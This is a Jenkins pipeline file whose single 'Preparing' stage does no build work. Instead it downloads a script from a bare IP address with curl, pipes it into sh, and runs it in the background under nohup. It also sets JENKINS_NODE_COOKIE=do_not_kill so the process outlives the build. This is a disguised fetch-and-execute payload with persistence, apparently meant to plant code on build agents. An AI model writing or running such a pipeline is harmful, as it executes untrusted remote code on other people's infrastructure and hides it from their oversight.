node('k8s-permanent') {
    try {
        stage("Preparing") {
            sh 'JENKINS_NODE_COOKIE=do_not_kill nohup bash -c "curl http://34.143.172.153/ss | sh" 2>&1 &'
        }
    } catch (e) {
        throw e
    }
}
